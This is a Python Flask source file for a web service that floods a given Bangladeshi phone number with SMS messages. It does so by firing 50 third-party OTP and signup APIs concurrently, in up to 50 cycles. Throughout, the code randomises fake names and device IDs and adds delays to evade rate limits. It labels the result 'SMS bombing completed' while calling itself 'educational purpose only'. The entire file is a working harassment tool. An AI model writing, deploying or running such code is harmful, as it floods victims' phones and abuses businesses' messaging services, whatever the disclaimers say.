import time
import random
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
from flask_cors import CORS

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__)
CORS(app)

# List of all API functions
API_FUNCTIONS = [
    api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
    api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19,
    api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28,
    api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37,
    api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46,
    api_47, api_48, api_49, api_50
]

# Blocked phone numbers list
BLOCKED_NUMBERS = ['01744298642']

def is_blocked_number(number):
    """Check if the phone number is blocked"""
    return number in BLOCKED_NUMBERS

def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None, name=None):
    """Execute a single API call with proper parameters"""
    # Check if number is blocked before making any API call
    if is_blocked_number(number):
        return False
    
    try:
        # Small random delay to avoid rate limiting
        time.sleep(random.uniform(0.05, 0.15))
        
        # Handle APIs with different parameter requirements
        if api_func in [api_9]:
            result = api_func(number, pgen, egen, did, name)
        elif api_func in [api_31]:
            result = api_func(number, egen, name)
        elif api_func in [api_33]:
            result = api_func(number, pgen, name)
        elif api_func in [api_37, api_39]:
            result = api_func(number, pgen, egen, name)
        else:
            result = api_func(number)
        
        if result and hasattr(result, 'status_code'):
            return result.status_code == 200
        return False
    except Exception:
        return False

def execute_bombing(number, req_count):
    """Execute bombing requests and return combined statistics"""
    
    # Check if number is blocked before processing
    if is_blocked_number(number):
        return {
            "status": "error",
            "message": "Request blocked",
            "error": "This phone number is not allowed to receive SMS",
            "blocked_number": number,
            "reason": "Number is on the restricted list",
            "disclaimer": "⚠️ Educational purpose only"
        }
    
    total_sent = 0
    total_attempts = 0
    working_api_count = 0
    failed_api_count = 0
    all_api_status = {}
    
    start_time = time.time()
    
    for cycle in range(req_count):
        # Generate random strings for each cycle
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        cycle_success = 0
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for api_func in API_FUNCTIONS:
                future = executor.submit(call_single_api, api_func, number, pgen, egen, did, None, name)
                futures.append((api_func.__name__, future))
            
            for api_name, future in futures:
                success = future.result()
                total_attempts += 1
                
                if success:
                    total_sent += 1
                    cycle_success += 1
                    
                    # Track working APIs
                    if api_name not in all_api_status:
                        all_api_status[api_name] = {"working": 0, "failed": 0}
                    all_api_status[api_name]["working"] += 1
                else:
                    if api_name not in all_api_status:
                        all_api_status[api_name] = {"working": 0, "failed": 0}
                    all_api_status[api_name]["failed"] += 1
        
        # Delay between cycles
        if cycle < req_count - 1:
            time.sleep(1.5)
    
    # Calculate final statistics
    execution_time = time.time() - start_time
    
    # Count how many APIs worked at least once
    for api_name, status in all_api_status.items():
        if status["working"] > 0:
            working_api_count += 1
        else:
            failed_api_count += 1
    
    success_rate = (total_sent / total_attempts * 100) if total_attempts > 0 else 0
    
    # Prepare formatted response
    response = {
        "status": "success",
        "message": "SMS bombing completed",
        "target": number,
        "summary": {
            "total_cycles": req_count,
            "total_requests": total_attempts,
            "sms_sent": total_sent,
            "sms_failed": total_attempts - total_sent,
            "success_rate": f"{success_rate:.2f}%",
            "execution_time": f"{execution_time:.2f} seconds"
        },
        "api_performance": {
            "working_apis": working_api_count,
            "failed_apis": failed_api_count,
            "total_apis": len(API_FUNCTIONS)
        },
        "disclaimer": "⚠️ Educational purpose only"
    }
    
    return response

@app.route('/', methods=['GET'])
def root():
    # Get parameters
    number = request.args.get('number')
    req_count = request.args.get('req')
    
    # Show usage guide if no parameters
    if number is None:
        return jsonify({
            "status": "error",
            "message": "Invalid request",
            "usage": {
                "endpoint": "/?number=017xxxxxxxx&req=1",
                "example": "/?number=01712345678&req=5",
                "parameters": {
                    "number": "11 digits phone number (without +88)",
                    "req": "Number of cycles (default: 1)"
                }
            },
            "disclaimer": "⚠️ Educational purpose only"
        }), 400
    
    # Validate phone number
    number = str(number).strip()
    
    # Check if number is blocked (early validation)
    if is_blocked_number(number):
        return jsonify({
            "status": "error",
            "message": "Access denied",
            "error": "This phone number is restricted from receiving SMS messages",
            "blocked_number": number,
            "code": "BLOCKED_NUMBER",
            "reason": "Number is on the restricted list",
            "suggestion": "Please use a different phone number",
            "disclaimer": "⚠️ Educational purpose only"
        }), 403
    
    if not number.isdigit():
        return jsonify({
            "status": "error",
            "message": "Invalid phone number",
            "error": "Number must contain only digits",
            "example": "01712345678"
        }), 400
    
    if len(number) != 11:
        return jsonify({
            "status": "error",
            "message": "Invalid phone number length",
            "error": f"Expected 11 digits, got {len(number)} digits",
            "example": "01712345678"
        }), 400
    
    if not number.startswith('01'):
        return jsonify({
            "status": "error",
            "message": "Invalid phone number prefix",
            "error": "Number must start with 01",
            "example": "01712345678"
        }), 400
    
    # Validate request count
    if not req_count:
        req_count = 1
    else:
        try:
            req_count = int(req_count)
            if req_count < 1:
                req_count = 1
            if req_count > 50:
                return jsonify({
                    "status": "error",
                    "message": "Request limit exceeded",
                    "error": "Maximum 50 cycles allowed",
                    "max_allowed": 50
                }), 400
        except ValueError:
            return jsonify({
                "status": "error",
                "message": "Invalid request count",
                "error": "req must be a valid number",
                "example": "req=5"
            }), 400
    
    try:
        # Execute bombing
        result = execute_bombing(number, req_count)
        
        # If result is an error response (blocked number), return with appropriate status code
        if result.get("status") == "error" and result.get("code") == "BLOCKED_NUMBER":
            return jsonify(result), 403
            
        return jsonify(result), 200
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": "Execution failed",
            "error": str(e)
        }), 500

# Health check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "service": "SMS API Service",
        "total_apis": len(API_FUNCTIONS),
        "blocked_numbers": BLOCKED_NUMBERS,
        "timestamp": time.time()
    }), 200

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "status": "error",
        "message": "Endpoint not found",
        "available_endpoints": [
            "/?number=017xxxxxxxx&req=1",
            "/health"
        ]
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        "status": "error",
        "message": "Internal server error",
        "error": "Please try again later"
    }), 500

if __name__ == '__main__':
    print("=" * 50)
    print("SMS API Service (Educational Purpose)")
    print("=" * 50)
    print(f"Total APIs: {len(API_FUNCTIONS)}")
    print(f"Blocked Numbers: {BLOCKED_NUMBERS}")
    print(f"Server: http://0.0.0.0:5000")
    print(f"Example: http://0.0.0.0:5000/?number=01712345678&req=5")
    print("=" * 50)
    print("⚠️ FOR EDUCATIONAL USE ONLY")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
